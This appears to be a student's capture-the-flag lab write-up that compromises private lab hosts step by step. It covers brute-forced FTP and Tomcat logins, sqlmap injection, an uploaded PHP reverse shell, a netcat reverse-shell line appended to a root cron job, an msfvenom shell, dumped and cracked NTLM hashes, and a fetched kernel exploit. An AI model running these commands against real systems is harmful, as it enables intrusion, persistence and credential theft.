Ethical-Hacking

flag{adcb1f}:
nmap -p21  -oA flaggor 10.0.0-15.0-254 
Host: 10.0.3.51 ()	Ports: 21/open/tcp//ftp///
searched this on google "password cracking ftp kali"
ncrack -U http_default_users.txt -P adobe_top100_pass.txt ftp://10.0.3.51 
  Discovered credentials for ftp on 10.0.3.51 21/tcp:
  10.0.3.51 21/tcp ftp: 'root' '1234'
https://www.howtogeek.com/412626/how-to-use-the-ftp-command-on-linux/
  ftp 10.0.3.51 
  username:root
  pass:1234
ls
flag{adcb1f4352c6330e2ed29a2a427d80964382b57b270db8}.jpg
-------------------------------------------------------------------------------------------
flag{90b353}:
nmap -p1- 10.0.3.51
nmap -p1- -sV 10.0.3.51
10.0.3.51:8282
http://10.0.3.51:8282/manager/html
msfconsole
set RPORT = 8282
set RHOSTS 10.0.3.51
set USERPASS_FILE http_default_users.txt
set USERPASS_FILE http_default_users.txt
set USERPASS_FILE http_default_users.txt
run 
[!] No active DB -- Credential data will not be saved!
[+] 10.0.3.51:8282 - Login Successful: admin:123456
login on the web 
http://10.0.3.51:8282/hacktheplanet-816494cc2ba913de/
flag{90b353493bf5b1a0bf68f04ed99e7a385cb7083ff57842}
---------------------------------------------------------------------------------------------
flag{521bce}:
run nmap to scan port 80
nmap -p80 10.0.0-15.0-254
http://10.0.2.233/ & found cuiteur
created Accounte user: javid 
navigated around and inspected source and found this
<!-- old page <a id="btnCherche" href="recherche_old.php" title="Search for Users to Follow"></a>-->
inspected source on old version and found:
<!-- flag{521bce72f9772561e4b5618ff6a613474fb18aa40946fa} -->
------------------------------------------------------------------------------------------------------
flag{de3b1c}:
https://www.google.com/search?client=firefox-b-e&q=sql+injectionma
used Burbsuit to save post request on search user "albert"
used sqlmap -r albert.txt --dbs

available databases [5]:
[*] cuiteur
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

used sqlmap -r albert.txt --tables -D cutieur
Database: cuiteur
[6 tables]
+-----------+
| blablas   |
| estabonne |
| flags     |
| mentions  |
| tags      |
| users     |
+-----------+

sqlmap -r albert.txt --dump  -T flags -D cuiteur

+---------+------------------------------------------------------+
| flag_id | flag                                                 |
+---------+------------------------------------------------------+
| 32f28e  | flag{de3b1c26953c031c37ba1d7bda9bca89e24d7b539392f2} |
+---------+------------------------------------------------------+
------------------------------------------------------------------------------------

flag{3b2000}:
http://10.0.2.233/php/reverse-shell.php
used sqlmap to upload php-reverse-shell.php
sqlmap -r albert.txt --file-write=./php-reverse-shell.php --file-dest=/var/www/html/php/reverse-shell.php
reload the webpage http://10.0.2.233/php/reverse-shell.php
nc -lvnp 2424
 find / -type f -name flag{* 2>/dev/null

/var/www/html/flag{3b2000b9c6cb4f72bdea7affa125b875113ab85283e8ea}.jpg

----------------------------------------------------------------------------------------------------------

flag{9f1f16}:

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

ls -la /etc/cron*
-rwxrw-rw-   1 www-data www-data  249 Feb 10 13:05 cuiteur-cleaning
cuiteur-cleaning made it possible to use as a script. 


 cat /etc/cron.hourly/cuiteur-cleaning
#!/bin/bash
/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#rust


echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f" >>/etc/cron.hourly/cuiteur-cleaning
$ cat /etc/cron.hourly/cuiteur-cleaning
#!/bin/bash
/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f

-----------------------------------------------------------------------------------------------------------------------------------

flag{f9038f}:
https://www.hackingarticles.in/credential-dumping-sam/
installed the LaZagne
upload file runme in apache tomcat
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.2 LPORT=8484 -f war > runme.war
listened on the runme server 
nc -lvnp 8484
started http server to upload my lazagne file into the machine
python -m http.server 80  
$URL = “http://192.168.0.2/LaZagne.exe”
$Path=”C:\windows\temp\myfile.exe”
./myfile.exe windows
save output as hash.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e666068d0bfe8cfb6d6c491834f78e0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
printer:1000:aad3b435b51404eeaad3b435b51404ee:44fa02794d20e21f23f7e69f6bccb89a:::
razor:1002:aad3b435b51404eeaad3b435b51404ee:2d8882531a3f4d09e4bb77f1a914c31c:::
hal:1003:aad3b435b51404eeaad3b435b51404ee:86b15ba3699800e1ae4467d3d873c780:::
mr_babbage:1004:aad3b435b51404eeaad3b435b51404ee:7ad0bf8992acc858750b62c3d3abbac3:::
phantom_phreak:1005:aad3b435b51404eeaad3b435b51404ee:1b5c137a88fc176acec58fe3c45c2c31:::
blade:1006:aad3b435b51404eeaad3b435b51404ee:d96b4259ebecd51c45f3682d7deac476:::
cereal_killer:1007:aad3b435b51404eeaad3b435b51404ee:bac2f953f298f4bd431f86e035ab656d:::
crash_override:1008:aad3b435b51404eeaad3b435b51404ee:05294aaffd692513f3b6572bb0c1be06:::
kate_libby:1009:aad3b435b51404eeaad3b435b51404ee:b2a37a0e225158d1aaec8fdc010266f1:::
joey:1010:aad3b435b51404eeaad3b435b51404ee:3b5dbb0a35d66305f7383151d3b91046:::
root:1011:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::

used john the ripper 
 john --format=NT --rules -w=/home/kali/Downloads/rockyou.txt hash.txt

pass             username
1234             (root)     
                 (Guest)     
manito           (razor)     
consuela         (phantom_phreak)     
refresher        (hal)     
desman           (cereal_killer)     
catacomb         (mr_babbage)     
wolter           (kate_libby)     
micrometer       (blade)     
rapidly          (crash_override)     
stu              (joey)  

telnet 10.0.2.147
the right user was joey
flag{f9038fd090b8490c7d8b613f0df054ba0e6ff63a82e19b}.jpg
-------------------------------------------------------------------------
used linux exploit suggester
find 

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh 
./les.sh --uname 'Linux matrix3-sea-turtle 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux' 


+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

wget https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
nc -lvnp 2424
 nc -w 5 192.168.0.2 2424 >eBPF.c
flag{6be6ef286c041a489b9f681acdd8afebb441a9b22df584}.jpg
----------------------------------------------------------------------






























